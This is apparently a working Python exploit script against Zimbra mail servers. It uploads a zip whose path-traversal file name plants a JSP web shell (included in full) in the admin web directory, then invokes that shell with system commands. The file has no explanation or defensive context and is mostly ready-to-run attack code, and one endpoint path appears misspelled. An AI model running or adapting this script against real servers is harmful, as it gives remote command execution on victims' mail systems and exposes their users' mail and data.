import requests
import zipfile
import io
import sys

JSP_SHELL = """<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM>
    <INPUT name='cmd' style='width:70%;' type=text>
    <INPUT type=submit value='exec'>
</FORM>
<pre>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    String error = "";
    if(cmd != null) {
        String[] commandAndArgs = new String[]{ "/bin/sh", "-c", cmd };
        String s = null;
        Process process = Runtime.getRuntime().exec(commandAndArgs);
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        Thread.sleep(2000);
        while(process.isAlive()) Thread.sleep(100);
        while((s = reader.readLine()) != null) { output += s+"&#13;&#10;"; }
        reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        while((s = reader.readLine()) != null) { error += s+"&#13;&#10;"; }
    }
%>

cmd: <%=cmd %><br>
output:<br>
<textarea style="width:100%; height: 50%"><%=output %></textarea>
error:<br>
<textarea style="width:100%; height: 30%"><%=error %></textarea>
</pre>
</BODY></HTML>
"""

def buildZip(jsp, path):
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, 'w')
    zf.writestr(path, jsp)
    zf.close()
    return zip_buffer.getvalue()

def exploit(host, payload, cmd):
    headers = {'content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(host + '/service/extensio3/backup/mboximport?account-name=admin&account-status=1&ow=cmd', data=payload, headers=headers)
    #print(r.status_code)
    r = requests.post(host + '/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1', data=payload, headers=headers)
    #print(r.status_code)
    r = requests.get(host + "/zimbraAdmin/admin.bk.jsp?cmd=" + cmd)
    print(r.status_code)

def main():
    link=sys.argv[1]
    print(link)
    path1='../../../../mailboxd/webapps/zimbraAdmin/admin.bk.jsp'
    path2='../../../../jetty_base/webapps/zimbraAdmin/admin.bk.jsp'
    path3='../../../../jetty/webapps/zimbraAdmin/admin.bk.jsp'
    payload = buildZip(JSP_SHELL, path1)
    exploit(link, payload, 'ps aux')
    payload = buildZip(JSP_SHELL, path2)
    exploit(link, payload, 'ps aux')
    payload = buildZip(JSP_SHELL, path3)
    exploit(link, payload, 'ls -la')

main()
